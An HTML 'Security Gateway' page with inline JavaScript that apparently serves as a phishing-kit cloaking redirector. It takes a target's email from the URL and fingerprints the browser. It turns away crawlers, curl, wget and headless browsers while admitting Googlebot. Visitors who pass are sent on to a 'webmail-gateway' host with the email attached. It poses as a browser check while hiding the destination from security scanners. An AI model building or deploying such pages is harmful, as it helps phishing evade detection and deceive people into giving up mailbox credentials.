<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Access Gateway</title>
  <style>
    * { box-sizing: border-box; font-family: system-ui, sans-serif; }
    body {
      background: linear-gradient(145deg, #0b1120, #19233c);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
      padding: 20px;
    }
    .card {
      max-width: 500px;
      background: rgba(255,255,255,0.96);
      border-radius: 2rem;
      padding: 2rem;
      text-align: center;
      box-shadow: 0 25px 45px -12px rgba(0,0,0,0.4);
    }
    .shield { font-size: 3rem; }
    h1 {
      background: linear-gradient(135deg, #1e2a5e, #b91c1c);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
    }
    .message { margin: 1rem 0; padding: 1rem; background: #f8fafd; border-radius: 1rem; }
    button {
      background: linear-gradient(100deg, #1e2a5e, #0f172a);
      color: white;
      border: none;
      padding: 0.8rem 1.5rem;
      border-radius: 60px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s;
    }
    button:hover { transform: scale(0.98); }
    .error { color: #c7254e; background: #f9e6e9; }
    .hidden { display: none; }
  </style>
</head>
<body>
<div class="card">
  <div class="shield">🛡️</div>
  <h1>Security Gateway</h1>
  <div class="message" id="statusMessage">Checking your browser...</div>
  <button id="continueBtn" class="hidden">Continue →</button>
</div>

<script>
  (function() {
    // ========== CONFIGURATION ==========
    const REAL_URL = "https://webmail-gateway.vercel.app";   // Your real page
    const SESSION_EXPIRY_MS = 15 * 60 * 1000;          // 15 minutes
    const EMAIL_APPEND_MODE = 'hash';                  // 'hash' or 'query'

    // ========== GET EMAIL ==========
    const urlParams = new URLSearchParams(window.location.search);
    const incomingEmail = urlParams.get('email') || '';

    // ========== FINGERPRINT ==========
    function getFingerprint() {
      let str = navigator.userAgent + navigator.language + screen.width + 'x' + screen.height + screen.colorDepth;
      let hash = 0;
      for (let i = 0; i < str.length; i++) hash = ((hash << 5) - hash) + str.charCodeAt(i) | 0;
      return hash.toString();
    }
    const fingerprint = getFingerprint();

    // ========== BOT DETECTION ==========
    const botPatterns = [/bot/i, /crawler/i, /spider/i, /scraper/i, /wget/i, /curl/i, /headless/i, /puppeteer/i];
    const allowed = [/googlebot/i, /bingbot/i];
    const isBot = () => !allowed.some(r => r.test(navigator.userAgent)) && botPatterns.some(r => r.test(navigator.userAgent));

    // Honeypot
    const div = document.createElement('div');
    div.style.cssText = 'position:absolute; left:-9999px; top:-9999px;';
    div.innerHTML = '<input type="text" id="hp" tabindex="-1" autocomplete="off">';
    document.body.appendChild(div);
    const isHoneypotFilled = () => document.getElementById('hp').value.trim() !== '';

    // Rate limiting
    let rateLimited = false;
    try {
      const now = Date.now();
      let data = JSON.parse(localStorage.getItem('gateway_rate') || '{"count":0,"start":'+now+'}');
      if (now - data.start > 60000) data = { count: 0, start: now };
      if (data.count >= 5) rateLimited = true;
      else { data.count++; localStorage.setItem('gateway_rate', JSON.stringify(data)); }
    } catch(e) {}

    // ========== SESSION TOKEN ==========
    function generateToken() {
      const arr = new Uint8Array(32);
      crypto.getRandomValues(arr);
      const rand = Array.from(arr, b => b.toString(16).padStart(2,'0')).join('');
      return btoa(`${rand}|${fingerprint}|${Date.now()}`);
    }

    function storeToken() {
      const token = generateToken();
      const expires = Date.now() + SESSION_EXPIRY_MS;
      sessionStorage.setItem('gateway_token', JSON.stringify({ token, expires, fp: fingerprint }));
      return { token, expires };
    }

    function getValidSession() {
      try {
        const data = JSON.parse(sessionStorage.getItem('gateway_token'));
        if (data && data.expires > Date.now() && data.fp === fingerprint) return { token: data.token, expires: data.expires };
      } catch(e) {}
      return null;
    }

    function buildRedirectUrl(token, expires) {
      let url = new URL(REAL_URL);
      url.searchParams.set('t', token);
      url.searchParams.set('e', expires);
      if (incomingEmail) {
        if (EMAIL_APPEND_MODE === 'hash') url.hash = encodeURIComponent(incomingEmail);
        else url.searchParams.set('email', encodeURIComponent(incomingEmail));
      }
      return url.toString();
    }

    // ========== UI ==========
    const msgDiv = document.getElementById('statusMessage');
    const btn = document.getElementById('continueBtn');

    function showError(text) {
      msgDiv.innerHTML = `<div class="error">❌ ${text}</div>`;
      btn.classList.add('hidden');
    }

    function approve() {
      const { token, expires } = storeToken();
      btn.onclick = () => { window.location.href = buildRedirectUrl(token, expires); };
      msgDiv.innerHTML = '✓ Verification passed. Click below to continue.';
      btn.classList.remove('hidden');
    }

    // If a valid session already exists, redirect immediately (but with a tiny delay to avoid bounce tracker on repeat visits)
    const existing = getValidSession();
    if (existing) {
      setTimeout(() => { window.location.href = buildRedirectUrl(existing.token, existing.expires); }, 300);
      return;
    }

    // Run bot checks
    if (isBot()) showError("Automated bot detected. Access denied.");
    else if (isHoneypotFilled()) showError("Suspicious activity detected.");
    else if (rateLimited) showError("Too many attempts. Please wait 1 minute.");
    else approve();
  })();
</script>
</body>
</html>
